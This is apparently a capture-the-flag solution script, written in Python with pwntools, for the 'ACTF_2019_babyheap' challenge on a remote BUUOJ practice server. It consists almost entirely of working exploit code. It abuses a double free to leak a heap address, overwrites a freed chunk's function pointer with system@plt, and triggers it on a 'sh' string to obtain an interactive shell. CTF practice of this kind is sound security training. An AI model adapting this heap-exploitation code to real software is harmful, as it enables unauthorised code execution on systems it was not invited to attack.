# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ACTF_2019_babyheap'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26841'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(':',num)

def add(size,content):
    cmd(1)
    sla('size:',size)
    sa('content:',content)

def delete(id):
    cmd(2)
    sla('index:',id)

def show(id):
    cmd(3)
    sla('index:',id)

system_addr = 0x0000000004007A0
#plt

add(0x20,"aa")
add(0x20,"aa")
add(0x30,"sh\x00")

delete(0)
delete(1)
delete(1)

show(0)

ru("Content is '")
heap = u64(p.recvuntil("'")[:-1].ljust(8,"\x00")) + (0xed4320 - 0xed4260)
lg("heap",heap)

add(0x10 , p64(heap) + p64(system_addr))

show(0)

p.interactive()

'''
@File    :   ACTF_2019_babyheap.py
@Time    :   2021/07/14 23:46:22
@Author  :   Niyah 
'''